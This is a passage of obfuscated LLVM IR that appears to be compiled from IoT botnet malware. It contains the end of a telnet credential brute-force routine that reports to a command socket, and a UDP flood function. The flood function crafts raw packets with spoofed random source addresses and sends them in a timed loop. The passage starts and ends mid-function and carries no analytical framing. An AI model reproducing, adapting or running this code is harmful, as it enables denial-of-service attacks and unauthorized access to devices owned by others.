  %2196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2195
  %2197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2196, i32 0, i32 5
  %2198 = load i8, i8* %2197, align 1
  %2199 = zext i8 %2198 to i64
  %2200 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %2199
  %2201 = load i8*, i8** %2200, align 8
  %2202 = call i32 (i32, i8*, ...) @sockprintf(i32 %2177, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i32 0, i32 0), i8* %2185, i8* %2193, i8* %2201)
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1757
  %2203 = load i32, i32* %4, align 4
  %2204 = sext i32 %2203 to i64
  %2205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2204
  %2206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2205, i32 0, i32 8
  %2207 = load i8*, i8** %2206, align 8
  %2208 = call i64 @strlen(i8* %2207) #10
  %2209 = trunc i64 %2208 to i16
  %2210 = load i32, i32* %4, align 4
  %2211 = sext i32 %2210 to i64
  %2212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2211
  %2213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2212, i32 0, i32 7
  store i16 %2209, i16* %2213, align 16
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1785
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1811
  %2214 = load i32, i32* %4, align 4
  %2215 = sext i32 %2214 to i64
  %2216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2215
  %2217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2216, i32 0, i32 0
  %2218 = load i32, i32* %2217, align 16
  %2219 = call i32 @sclose(i32 %2218)
  %2220 = load i32, i32* %4, align 4
  %2221 = sext i32 %2220 to i64
  %2222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2221
  %2223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2222, i32 0, i32 2
  store i8 0, i8* %2223, align 8
  %2224 = load i32, i32* %4, align 4
  %2225 = sext i32 %2224 to i64
  %2226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2225
  %2227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2226, i32 0, i32 3
  store i8 1, i8* %2227, align 1
  br label %originalBB182
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @time(...) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %51

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* @x.65
  %33 = load i32, i32* @y.66
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  %40 = call i32 @rand_cmwc()
  %41 = trunc i32 %40 to i16
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  %43 = load i32, i32* @x.65
  %44 = load i32, i32* @y.66
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %56

; <label>:51:                                     ; preds = %6
  %52 = load i32, i32* %8, align 4
  %53 = trunc i32 %52 to i16
  %54 = call zeroext i16 @htons(i16 zeroext %53) #13
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %54, i16* %55, align 2
  br label %56

; <label>:56:                                     ; preds = %51, %originalBBpart2
  %57 = load i32, i32* @x.65
  %58 = load i32, i32* @y.66
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %56
  %65 = load i8*, i8** %7, align 8
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %67 = call i32 @getHost(i8* %65, %struct.in_addr* %66)
  %68 = icmp ne i32 %67, 0
  %69 = load i32, i32* @x.65
  %70 = load i32, i32* @y.66
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %68, label %77, label %78

; <label>:77:                                     ; preds = %originalBBpart24
  br label %493

; <label>:78:                                     ; preds = %originalBBpart24
  %79 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %80 = getelementptr inbounds [8 x i8], [8 x i8]* %79, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %80, i8 0, i64 8, i32 4, i1 false)
  %81 = load i32, i32* %12, align 4
  store i32 %81, i32* %14, align 4
  %82 = load i32, i32* %10, align 4
  %83 = icmp eq i32 %82, 32
  br i1 %83, label %84, label %200

; <label>:84:                                     ; preds = %78
  %85 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %85, i32* %15, align 4
  %86 = load i32, i32* %15, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %91, label %88

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* @mainCommSock, align 4
  %90 = call i32 (i32, i8*, ...) @sockprintf(i32 %89, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0))
  br label %493

; <label>:91:                                     ; preds = %84
  %92 = load i32, i32* %11, align 4
  %93 = add nsw i32 %92, 1
  %94 = sext i32 %93 to i64
  %95 = call noalias i8* @malloc(i64 %94) #2
  store i8* %95, i8** %16, align 8
  %96 = load i8*, i8** %16, align 8
  %97 = icmp eq i8* %96, null
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %91
  br label %493

; <label>:99:                                     ; preds = %91
  %100 = load i32, i32* @x.65
  %101 = load i32, i32* @y.66
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %99
  %108 = load i8*, i8** %16, align 8
  %109 = load i32, i32* %11, align 4
  %110 = add nsw i32 %109, 1
  %111 = sext i32 %110 to i64
  call void @llvm.memset.p0i8.i64(i8* %108, i8 0, i64 %111, i32 1, i1 false)
  %112 = load i8*, i8** %16, align 8
  %113 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %112, i32 %113)
  %114 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %115 = load i32, i32* %9, align 4
  %116 = add nsw i32 %114, %115
  store i32 %116, i32* %17, align 4
  store i32 0, i32* %18, align 4
  %117 = load i32, i32* @x.65
  %118 = load i32, i32* @y.66
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %125

; <label>:125:                                    ; preds = %originalBBpart231, %originalBBpart216, %originalBBpart28
  %126 = load i32, i32* @x.65
  %127 = load i32, i32* @y.66
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %125
  %134 = load i32, i32* %15, align 4
  %135 = load i8*, i8** %16, align 8
  %136 = load i32, i32* %11, align 4
  %137 = sext i32 %136 to i64
  %138 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %139 = call i64 @sendto(i32 %134, i8* %135, i64 %137, i32 0, %struct.sockaddr* %138, i32 16)
  %140 = load i32, i32* %18, align 4
  %141 = load i32, i32* %14, align 4
  %142 = icmp eq i32 %140, %141
  %143 = load i32, i32* @x.65
  %144 = load i32, i32* @y.66
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %142, label %151, label %180

; <label>:151:                                    ; preds = %originalBBpart212
  %152 = load i32, i32* %8, align 4
  %153 = icmp eq i32 %152, 0
  br i1 %153, label %154, label %158

; <label>:154:                                    ; preds = %151
  %155 = call i32 @rand_cmwc()
  %156 = trunc i32 %155 to i16
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %156, i16* %157, align 2
  br label %158

; <label>:158:                                    ; preds = %154, %151
  %159 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %160 = load i32, i32* %17, align 4
  %161 = icmp sgt i32 %159, %160
  br i1 %161, label %162, label %163

; <label>:162:                                    ; preds = %158
  br label %199

; <label>:163:                                    ; preds = %158
  %164 = load i32, i32* @x.65
  %165 = load i32, i32* @y.66
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %163
  store i32 0, i32* %18, align 4
  %172 = load i32, i32* @x.65
  %173 = load i32, i32* @y.66
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %125

; <label>:180:                                    ; preds = %originalBBpart212
  %181 = load i32, i32* @x.65
  %182 = load i32, i32* @y.66
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %180
  %189 = load i32, i32* %18, align 4
  %190 = add i32 %189, 1
  store i32 %190, i32* %18, align 4
  %191 = load i32, i32* @x.65
  %192 = load i32, i32* @y.66
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart231, label %originalBB18alteredBB

originalBBpart231:                                ; preds = %originalBB18
  br label %125

; <label>:199:                                    ; preds = %162
  br label %493

; <label>:200:                                    ; preds = %78
  %201 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %201, i32* %19, align 4
  %202 = load i32, i32* %19, align 4
  %203 = icmp ne i32 %202, 0
  br i1 %203, label %207, label %204

; <label>:204:                                    ; preds = %200
  %205 = load i32, i32* @mainCommSock, align 4
  %206 = call i32 (i32, i8*, ...) @sockprintf(i32 %205, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0))
  br label %493

; <label>:207:                                    ; preds = %200
  store i32 1, i32* %20, align 4
  %208 = load i32, i32* %19, align 4
  %209 = bitcast i32* %20 to i8*
  %210 = call i32 @setsockopt(i32 %208, i32 0, i32 3, i8* %209, i32 4) #2
  %211 = icmp slt i32 %210, 0
  br i1 %211, label %212, label %215

; <label>:212:                                    ; preds = %207
  %213 = load i32, i32* @mainCommSock, align 4
  %214 = call i32 (i32, i8*, ...) @sockprintf(i32 %213, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.36, i32 0, i32 0))
  br label %493

; <label>:215:                                    ; preds = %207
  store i32 50, i32* %21, align 4
  br label %216

; <label>:216:                                    ; preds = %originalBBpart249, %215
  %217 = load i32, i32* @x.65
  %218 = load i32, i32* @y.66
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %216
  %225 = load i32, i32* %21, align 4
  %226 = add nsw i32 %225, -1
  store i32 %226, i32* %21, align 4
  %227 = icmp ne i32 %225, 0
  %228 = load i32, i32* @x.65
  %229 = load i32, i32* @y.66
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart237, label %originalBB33alteredBB

originalBBpart237:                                ; preds = %originalBB33
  br i1 %227, label %236, label %257

; <label>:236:                                    ; preds = %originalBBpart237
  %237 = load i32, i32* @x.65
  %238 = load i32, i32* @y.66
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %236
  %245 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %246 = call i32 @rand_cmwc()
  %247 = xor i32 %245, %246
  call void @srand(i32 %247) #2
  %248 = call i32 @rand() #2
  call void @init_rand(i32 %248)
  %249 = load i32, i32* @x.65
  %250 = load i32, i32* @y.66
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBBpart249, label %originalBB39alteredBB

originalBBpart249:                                ; preds = %originalBB39
  br label %216

; <label>:257:                                    ; preds = %originalBBpart237
  %258 = load i32, i32* %10, align 4
  %259 = icmp eq i32 %258, 0
  br i1 %259, label %260, label %277

; <label>:260:                                    ; preds = %257
  %261 = load i32, i32* @x.65
  %262 = load i32, i32* @y.66
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %260
  store i32 0, i32* %22, align 4
  %269 = load i32, i32* @x.65
  %270 = load i32, i32* @y.66
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %283

; <label>:277:                                    ; preds = %257
  %278 = load i32, i32* %10, align 4
  %279 = sub nsw i32 32, %278
  %280 = shl i32 1, %279
  %281 = sub nsw i32 %280, 1
  %282 = xor i32 %281, -1
  store i32 %282, i32* %22, align 4
  br label %283

; <label>:283:                                    ; preds = %277, %originalBBpart253
  %284 = load i32, i32* @x.65
  %285 = load i32, i32* @y.66
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %283
  %292 = load i32, i32* %11, align 4
  %293 = sext i32 %292 to i64
  %294 = add i64 28, %293
  %295 = call i8* @llvm.stacksave()
  store i8* %295, i8** %23, align 8
  %296 = alloca i8, i64 %294, align 16
  %297 = bitcast i8* %296 to %struct.iphdr*
  store %struct.iphdr* %297, %struct.iphdr** %24, align 8
  %298 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %299 = bitcast %struct.iphdr* %298 to i8*
  %300 = getelementptr i8, i8* %299, i64 20
  %301 = bitcast i8* %300 to %struct.udphdr*
  store %struct.udphdr* %301, %struct.udphdr** %25, align 8
  %302 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %303 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %304 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 4
  %306 = load i32, i32* %22, align 4
  %307 = call i32 @getRandomIP(i32 %306)
  %308 = call i32 @htonl(i32 %307) #13
  %309 = load i32, i32* %11, align 4
  %310 = sext i32 %309 to i64
  %311 = add i64 8, %310
  %312 = trunc i64 %311 to i32
  call void @makeIPPacket(%struct.iphdr* %302, i32 %305, i32 %308, i8 zeroext 17, i32 %312)
  %313 = load i32, i32* %11, align 4
  %314 = sext i32 %313 to i64
  %315 = add i64 8, %314
  %316 = trunc i64 %315 to i16
  %317 = call zeroext i16 @htons(i16 zeroext %316) #13
  %318 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %319 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.2* %319 to %struct.anon.3*
  %321 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %320, i32 0, i32 2
  store i16 %317, i16* %321, align 2
  %322 = call i32 @rand_cmwc()
  %323 = trunc i32 %322 to i16
  %324 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %325 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %324, i32 0, i32 0
  %326 = bitcast %union.anon.2* %325 to %struct.anon.3*
  %327 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %326, i32 0, i32 0
  store i16 %323, i16* %327, align 2
  %328 = load i32, i32* %8, align 4
  %329 = icmp eq i32 %328, 0
  %330 = load i32, i32* @x.65
  %331 = load i32, i32* @y.66
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart271, label %originalBB55alteredBB

originalBBpart271:                                ; preds = %originalBB55
  br i1 %329, label %338, label %340

; <label>:338:                                    ; preds = %originalBBpart271
  %339 = call i32 @rand_cmwc()
  br label %361

; <label>:340:                                    ; preds = %originalBBpart271
  %341 = load i32, i32* @x.65
  %342 = load i32, i32* @y.66
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %340
  %349 = load i32, i32* %8, align 4
  %350 = trunc i32 %349 to i16
  %351 = call zeroext i16 @htons(i16 zeroext %350) #13
  %352 = zext i16 %351 to i32
  %353 = load i32, i32* @x.65
  %354 = load i32, i32* @y.66
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %361

; <label>:361:                                    ; preds = %originalBBpart275, %338
  %362 = phi i32 [ %339, %338 ], [ %352, %originalBBpart275 ]
  %363 = trunc i32 %362 to i16
  %364 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %365 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %364, i32 0, i32 0
  %366 = bitcast %union.anon.2* %365 to %struct.anon.3*
  %367 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %366, i32 0, i32 1
  store i16 %363, i16* %367, align 2
  %368 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %369 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %368, i32 0, i32 0
  %370 = bitcast %union.anon.2* %369 to %struct.anon.3*
  %371 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %370, i32 0, i32 3
  store i16 0, i16* %371, align 2
  %372 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %373 = bitcast %struct.udphdr* %372 to i8*
  %374 = getelementptr inbounds i8, i8* %373, i64 8
  %375 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %374, i32 %375)
  %376 = bitcast i8* %296 to i16*
  %377 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 2
  %379 = load i16, i16* %378, align 2
  %380 = zext i16 %379 to i32
  %381 = call zeroext i16 @csum(i16* %376, i32 %380)
  %382 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 %381, i16* %383, align 2
  %384 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %385 = load i32, i32* %9, align 4
  %386 = add nsw i32 %384, %385
  store i32 %386, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %387

; <label>:387:                                    ; preds = %488, %487, %361
  br label %388

; <label>:388:                                    ; preds = %387
  %389 = load i32, i32* @x.65
  %390 = load i32, i32* @y.66
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %388
  %397 = load i32, i32* %19, align 4
  %398 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %399 = call i64 @sendto(i32 %397, i8* %296, i64 %294, i32 0, %struct.sockaddr* %398, i32 16)
  %400 = call i32 @rand_cmwc()
  %401 = trunc i32 %400 to i16
  %402 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i32 0, i32 0
  %404 = bitcast %union.anon.2* %403 to %struct.anon.3*
  %405 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %404, i32 0, i32 0
  store i16 %401, i16* %405, align 2
  %406 = load i32, i32* %8, align 4
  %407 = icmp eq i32 %406, 0
  %408 = load i32, i32* @x.65
  %409 = load i32, i32* @y.66
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br i1 %407, label %416, label %418

; <label>:416:                                    ; preds = %originalBBpart279
  %417 = call i32 @rand_cmwc()
  br label %439

; <label>:418:                                    ; preds = %originalBBpart279
  %419 = load i32, i32* @x.65
  %420 = load i32, i32* @y.66
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %418
  %427 = load i32, i32* %8, align 4
  %428 = trunc i32 %427 to i16
  %429 = call zeroext i16 @htons(i16 zeroext %428) #13
  %430 = zext i16 %429 to i32
  %431 = load i32, i32* @x.65
  %432 = load i32, i32* @y.66
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br label %439

; <label>:439:                                    ; preds = %originalBBpart283, %416
  %440 = phi i32 [ %417, %416 ], [ %430, %originalBBpart283 ]
  %441 = trunc i32 %440 to i16
  %442 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %443 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %442, i32 0, i32 0
  %444 = bitcast %union.anon.2* %443 to %struct.anon.3*
  %445 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %444, i32 0, i32 1
  store i16 %441, i16* %445, align 2
  %446 = call i32 @rand_cmwc()
  %447 = trunc i32 %446 to i16
  %448 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %449 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %448, i32 0, i32 3
  store i16 %447, i16* %449, align 4
  %450 = load i32, i32* %22, align 4
  %451 = call i32 @getRandomIP(i32 %450)
  %452 = call i32 @htonl(i32 %451) #13
  %453 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %454 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %453, i32 0, i32 8
  store i32 %452, i32* %454, align 4
  %455 = bitcast i8* %296 to i16*
  %456 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 2
  %458 = load i16, i16* %457, align 2
  %459 = zext i16 %458 to i32
  %460 = call zeroext i16 @csum(i16* %455, i32 %459)
  %461 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 7
  store i16 %460, i16* %462, align 2
  %463 = load i32, i32* %27, align 4
  %464 = load i32, i32* %14, align 4
  %465 = icmp eq i32 %463, %464
  br i1 %465, label %466, label %488

; <label>:466:                                    ; preds = %439
  %467 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %468 = load i32, i32* %26, align 4
  %469 = icmp sgt i32 %467, %468
  br i1 %469, label %470, label %487

; <label>:470:                                    ; preds = %466
  %471 = load i32, i32* @x.65
  %472 = load i32, i32* @y.66
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %470
  %479 = load i32, i32* @x.65
  %480 = load i32, i32* @y.66
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %491

; <label>:487:                                    ; preds = %466
  store i32 0, i32* %27, align 4
  br label %387

; <label>:488:                                    ; preds = %439
  %489 = load i32, i32* %27, align 4
  %490 = add i32 %489, 1
  store i32 %490, i32* %27, align 4
  br label %387

; <label>:491:                                    ; preds = %originalBBpart287
  %492 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %492)
  br label %493

; <label>:493:                                    ; preds = %491, %212, %204, %199, %98, %88, %77
  %494 = load i32, i32* @x.65
  %495 = load i32, i32* @y.66
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
